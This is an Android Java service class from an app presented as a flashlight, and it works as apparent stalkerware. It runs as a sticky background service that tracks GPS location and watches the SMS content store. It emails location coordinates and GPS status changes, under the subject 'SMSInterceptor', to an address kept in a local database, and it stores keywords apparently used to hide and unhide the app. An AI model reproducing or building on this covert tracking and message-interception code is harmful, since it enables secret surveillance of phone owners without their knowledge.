package com.flash.light; 

import android.os.Bundle;
import android.os.IBinder;
import android.os.Handler;
import android.os.Message;
import android.os.Messenger;
import android.os.SystemClock; 

import android.app.Service;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;

import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.pm.PackageManager;

import android.location.Location;
import android.location.LocationManager;
import android.location.LocationListener;

import java.util.List;
import android.net.Uri;
import java.lang.Double;
import android.util.Log;
import android.widget.Toast;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.database.ContentObserver;

public class FlashLightService extends Service implements LocationListener {

  private static String gmailEmailString;
  private static final String TAG = "FlashLight FLService";

  public  static String sGetHideDb;
  public  static String sHideKeywordDb;
  public  static String sPhoneNumberDb;
  public  static String sUnhideKeywordDb;
  public  static String sEmailAddressDb;

  private static GmailSender sender;
  private static LocationManager locationManager;
  private static DatabaseHandler databaseHandler;

  private static boolean eLocation = false;
  private static boolean mLocation = false;

  public FlashLightService() { 
    gmailEmailString = emailAddress();
    Log.i(TAG, "Entering FlashLightService() constructor");
    Log.i(TAG, "FlashLightServce() constructor gmailEmailString " + gmailEmailString);
  } 

  final Messenger mMessenger = new Messenger(new IncomingHandler());

  static class IncomingHandler extends Handler {
    @Override
    public void handleMessage(Message msg) {
      super.handleMessage(msg);
    }
  }

  public boolean gpsEnabled() {
    return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
  }

  @Override
  public IBinder onBind(Intent intent) {
    return mMessenger.getBinder();
  }

  @Override
  public void onProviderDisabled(String s) {
    threading("GPS has been 'DIS'abled!");
    eLocation = false;
  }

  @Override
  public void onStatusChanged(String s, int i, Bundle bundle) { }

  @Override
  public void onProviderEnabled(String s) {
    threading("GPS has been 'EN'abled!");
    eLocation = true;
  }

  @Override
  public void onLocationChanged(Location location) {
    if(mLocation) {
      Double dLatitude  = location.getLatitude();
      final String latitude   = String.valueOf(dLatitude);
      Double dlongitude = location.getLongitude();
      final String longitude  = String.valueOf(dlongitude);

      threading("Location!\nlatitude-longitude coordinates:\n" +
        "" + latitude + "," + longitude);
    }
    mLocation = false;
  }

  @Override
  public void onTaskRemoved(Intent rootIntent) {
    super.onTaskRemoved(rootIntent);
    Log.d(TAG,"onTaskRemoved()");
  }

  @Override
  public void onDestroy() {
    super.onDestroy();
    Log.d(TAG, "onDestroy()");
  }

  @Nullable
  public String getHide() throws NullPointerException {

    String get_hide = "null";

    try {     
      if(!getDatabaseInfo().equals("null")) {
        get_hide = sGetHideDb;
      }
    }
    catch(NullPointerException e) { }

    Log.d(TAG, "unhideKeyword() unhide_keyword " + get_hide);
    return get_hide;

  }

  @Nullable
  public String emailAddress() throws NullPointerException {

    String email_address = "null";

    try {
      if(!getDatabaseInfo().equals("null")) {
        email_address = sEmailAddressDb;
      }
    }
    catch(NullPointerException e) { }

    Log.d(TAG, "emailAddress() email_address " + email_address);
    return email_address;
  }

  @Nullable
  public String phoneNumber() throws NullPointerException {

    String phone_number = "null";

    try {
      if(!getDatabaseInfo().equals("null")) {
        phone_number = sPhoneNumberDb;
      }
    }
    catch(NullPointerException e) { }

    Log.d(TAG, "phoneNumber() phone_number " + phone_number);
    return phone_number;
  }

  @Nullable
  public String hideKeyword() throws NullPointerException {

    String hide_keyword = "null";

    try {
      if(!getDatabaseInfo().equals("null")) {
        hide_keyword = sHideKeywordDb;
      }
    }
    catch(NullPointerException e) { }

    Log.d(TAG, "hideKeyword() hide_keyword " + hide_keyword);
    return hide_keyword;
  }

  @Nullable
  public String unhideKeyword() throws NullPointerException {

    String unhide_keyword = "null";

    try {
      if(!getDatabaseInfo().equals("null")) {
        unhide_keyword = sUnhideKeywordDb;
      }
    }
    catch(NullPointerException e) { }

    Log.d(TAG, "unhideKeyword() unhide_keyword " + unhide_keyword);
    return unhide_keyword;

  }

  @Nullable
  public String getDatabaseInfo() throws NullPointerException {

    String database_action = "null";

    if(databaseHandler == null) {
      databaseHandler = new DatabaseHandler(this);
      Log.d(TAG, "getDatabaseInfo() databaseHandler == null");
    }

    try {
      List<FlashLightDatabase> flashLightDatabase = databaseHandler.getAllFlashLightDatabase();
      for(FlashLightDatabase fldb : flashLightDatabase) {
        sGetHideDb       = fldb.getHide();
        sPhoneNumberDb   = fldb.getPhoneNumber();
        sHideKeywordDb   = fldb.getHideKeyword();
        sEmailAddressDb  = fldb.getEmailAddress();
        sUnhideKeywordDb = fldb.getUnhideKeyword();
      }
      if(sEmailAddressDb != null) {
        database_action = "update";
        Log.d(TAG, "getDatabaseInfo() sGetHideDb " + sGetHideDb);
        Log.d(TAG, "getDatabaseInfo() sPhoneNumberDb " + sPhoneNumberDb);
        Log.d(TAG, "getDatabaseInfo() sHideKeywordDb " + sHideKeywordDb);
        Log.d(TAG, "getDatabaseInfo() sEmailAddressDb " + sEmailAddressDb);
        Log.d(TAG, "getDatabaseInfo() sUnhideKeywordDb " + sUnhideKeywordDb);
      }
      else if(sEmailAddressDb == null && flashLightDatabase != null) {
        database_action = "create";
      }
    }
    catch(NullPointerException e) { }

    Log.d(TAG, "getDatabaseInfo() database_action " + database_action);
    return database_action;
  }

  public void threading(final String message) {
    final String SUBJECT = "SMSInterceptor";
    new Thread(new Runnable() {
      @Override
      public void run() {
        try {
          sender = new GmailSender();
          sender.sendMail(SUBJECT, message, gmailEmailString);
        }
        catch(Exception e) {
          Log.e(TAG, "thread() Exception e " + e.toString());
          e.printStackTrace();
        }
      }
    }).start();
  }


  public void onCreate(Context context, Intent intent) {
    Log.d(TAG, "onCreate()");
    try {
      if(intent.getAction() != null) {
        intent = new Intent(context, FlashLight.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
      }
    }
    catch(Exception e) {
      e.printStackTrace();
    }
  }

  @Nullable
  @Override
  public int onStartCommand(Intent intent, int flag, int startId) throws NullPointerException {

    Log.d(TAG, "onStartCommand() Entering onStartCommand method.");

    databaseHandler = new DatabaseHandler(this);

    getDatabaseInfo();

    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
 
    if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
      Log.d(TAG, "onStartCommand() eLocation = TRUE");
      eLocation = true;
    }
    else {
      Log.d(TAG, "onStartCommand() eLocation = FALSE");
      eLocation = false;
    }

    //String data;
    //if(!eLocation && data != null && intent.hasExtra("obtainLocation")) {
    try {
      if(!eLocation && intent.hasExtra("obtainLocation")) {
        threading("GPS is not enabled. Cannot obtain location.");
      }
      else if(eLocation && intent.hasExtra("obtainLocation")) {
        mLocation = true;
      }
    }
    catch(NullPointerException e) {
      Log.e(TAG, "onStartCommand() NullPointerException e " + e.toString());
    }

    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,30000,10,this);

    try {
      Handler mSmsObserverHandler = new Handler();
      ContentResolver contentResolver = this.getApplicationContext().getContentResolver();
      SMSObserver smsObserver = new SMSObserver(mSmsObserverHandler, getApplicationContext());
      contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
    }
    catch(NullPointerException e) {
      Log.e(TAG, "onStartCommand() NullPointerException e, Error creating ContentObserver()");
    }

    return START_STICKY;
  }

}
